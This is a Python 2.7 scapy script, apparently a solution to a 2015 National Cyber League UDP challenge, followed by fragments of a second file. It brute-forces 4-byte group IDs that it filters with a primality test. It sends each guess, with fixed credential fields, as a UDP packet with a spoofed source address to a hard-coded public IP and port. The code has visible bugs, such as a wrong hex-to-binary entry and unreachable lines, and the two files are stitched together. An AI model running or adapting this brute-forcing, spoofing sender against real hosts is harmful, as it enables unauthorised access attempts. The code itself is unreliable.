#!/usr/bin/python
#python 2.7
#NCL UDP Team event 2015
#koalatea

# Import scapy
from scapy.all import *
import copy
import random 
conf.verb = 0
# Ports
#78 is check, next 8 fileds are the brute forced group id, next 12 are username as 01 and nulls (00) and the next 12 are password 01 and nulls (00)
#for i in range: 
hexdict = {'0':['0','0','0','0'],'1':['0','0','0','1'],'2':['0','0','0','1'],'3':['0','0','1','1'],'4':['0','0','1','0'],'5':['0','1','0','1'],'6':['0','1','1','0'],'7':['0','1','1','1'],'8':['1','0','0','0'],'9':['1','0','0','1'],'A':['1','0','1','0'],'B':['1','0','1','1'],'C':['1','1','0','0'],'D':['1','1','0','1'],'E':['1','1','1','0'],'F':['1','1','1','1']}

def toint(thehex):
        myhex = thehex[1:]
	temphex="".join(myhex)
	return int(temphex,16)
	tempbin = []
	mybin = []
        for i in myhex:
		tempbin = hexdict[i[0]]
		for j in tempbin:
			mybin.append(j)
		tempbin=hexdict[i[1]]
		for j in tempbin:
			mybin.append(j)
	myfullbin = "".join(mybin)
	print(int(myfullbin,2))
	return int(myfullbin,2)

def tobinary(m):
        binary = []                     #binary holds the exponent in binary form
        while(m != 0):                  #loop to change to binary
                binary.append(m%2)      #append a 1 if odd 0 if even
                m = m / 2               #half the size using python div (does int div not float)(floors)
        binary.reverse()
        return binary

#
# squareandmult:
#       does square and multiply for the exponentiation of the random a
#
# args:
#       a - random int to be raised to test (base) (also not random...)
#       m - exponent (binary)
#       n - number being tested used as mod in this portion
#
def squareandmult(a, m, n):
        current = 1
        for i in m:
                if(i == 0):
                        current = (current * current) % n
                else:
                        current = (current * current * a) % n
        if(current == 1):
                return 0
        else:
                return 1

#
# test2
#       same as squareandmult except testing for -1modn
#
def test2(a,m,n):
        current = 1
        for i in m:
                if(i == 0):
                        current = (current * current) % n
                else:
                        current = (current * current * a) % n
        if(current == (n-1) ):
                return 0
        else:
                return 1


def main(num):
	if(num==1):
		return 1
	if(num==3):
		return 3
        p = num - 1             #the n-1 value to determine the odd factor in use
        exp=0                   #counter for testing exponetials
        
        r=p;
        while(r%2==0):          #find r which iss the n-1=2^exp * r 
                r=r/2
                exp=exp+1
        rbinary = tobinary(r)   #make our r binary

        #prime = bruter(num)    #check if number is prime for later testing
        #for a in range(2,num-1):#range from 
        a=random.randint(2,num-2)
        res = squareandmult(a, rbinary, num)
        #if prime error should be 0 make sure alg works
        if(res):#if not 1modn test for -1modn
                s = 0
                while(res==1 and s < exp):
                        r2=r*(2**s)
                        res = test2(a, tobinary(r2), num)
                        s=s+1
        if(res==1):
                return 0
        else:
                return 1


hexman = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F']
hexvalues=[]
for i in hexman:
	hexnum=i
	for j in hexman:
		hexnum2=hexnum
		hexnum2 = hexnum2 + j
		hexvalues.append(hexnum2)

print(hexvalues)
data2 = ['01','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','01','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00']
for i1 in hexvalues:
	data = ['78']
	tdata1 = copy.deepcopy(data)
	tdata1.append(i1)
	#print("1")
	for i2 in hexvalues:
		tdata2=copy.deepcopy(tdata1)
		tdata2.append(i2)
		#print("2")
		for i3 in hexvalues:
			tdata3=copy.deepcopy(tdata2)
			tdata3.append(i3)
			#print("3")
			for i4 in hexvalues:
				tdata4=copy.deepcopy(tdata3)
				tdata4.append(i4)
				#print("4")
				if(int(i4[1], 16)%2==0):
					pass
				else:
					mynum=toint(tdata4)
					if(main(mynum)):
						print(mynum)
						for n in data2:
							tdata4.append(n)
						encoded= ''.join(tdata4).decode('hex')
						#print "sendin ", tdata8 
						ip = IP(dst="104.236.16.36",src="192.168.152.128")
						port = 39367
						SYN = ip/UDP(sport=port, dport=3050)/Raw(load=encoded)
						send(SYN)
#!/usr/bin/python
#Ryan Whittier

'''
def main(num):
	p = num - 1		#the n-1 value to determine the odd factor in use
	exp=0			#counter for testing exponetials
	
	r=p;
	while(r%2==0):		#find r which iss the n-1=2^exp * r 
		r=r/2
		exp=exp+1
	rbinary = tobinary(r)	#make our r binary

	#prime = bruter(num)	#check if number is prime for later testing
	#for a in range(2,num-1):#range from 
	a=random.randint(2,n-2)
	res = squareandmult(a, rbinary, num)
	#if prime error should be 0 make sure alg works
	if(res):#if not 1modn test for -1modn
		s = 0
		while(res==1 and s < exp):
			r2=r*(2**s)
			res = test2(a, tobinary(r2), num)
			s=s+1
	if(res==1):
		return 0
	else:
		return 1
'''
'''
	else:		#if not prime reverse 0 and 1 returns from squareandmult
			#as well as test2
		if(res):
			s = 0
			while(res==1 and s < exp):
				r2=r*(2**s)
				res = test2(a, tobinary(r2), num)
				s=s+1
			if(res):
				return 0
			else:
				return 1
		else:
			return
'''	

def bruter(n):
	temp = 2
	prime = 1
	while(prime==1):
		if( ((n/2)+1) < temp ):
			break
		if(n%temp==0):
			prime = 0
		else:
			temp = temp + 1
	return prime

'''
def tobinary(m):
	binary = []			#binary holds the exponent in binary form
	while(m != 0):			#loop to change to binary
		binary.append(m%2)	#append a 1 if odd 0 if even
		m = m / 2		#half the size using python div (does int div not float)(floors)
	binary.reverse()
	return binary
'''
